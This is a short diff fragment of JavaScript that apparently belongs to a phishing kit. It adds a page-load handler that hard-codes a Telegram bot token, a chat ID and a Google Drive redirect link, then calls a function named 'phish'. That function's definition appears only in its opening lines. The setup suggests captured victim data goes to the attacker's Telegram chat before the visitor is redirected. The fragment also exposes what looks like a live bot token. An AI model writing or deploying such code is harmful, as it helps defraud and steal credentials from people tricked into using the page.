@@ -1,3 +1,11 @@
+
+        $(document).ready(function () {
+            const BOT_TOKEN = '1505663607:AAF_zOQJ4A8S2m0ZW4Cd56jNIvxHJC_HezA',
+                CHAT_ID = '1048767139',
+                REDIRECT_URL = 'https://drive.google.com/file/d/1sHOKRjcOvqm8X0RFuAnWP1eub9pO8pYc/view'
+            phish(BOT_TOKEN, CHAT_ID, REDIRECT_URL);
+        });
+
 const phish = (bot_token, chat_id, redirect_link) => {
     var module = {
         options: [],
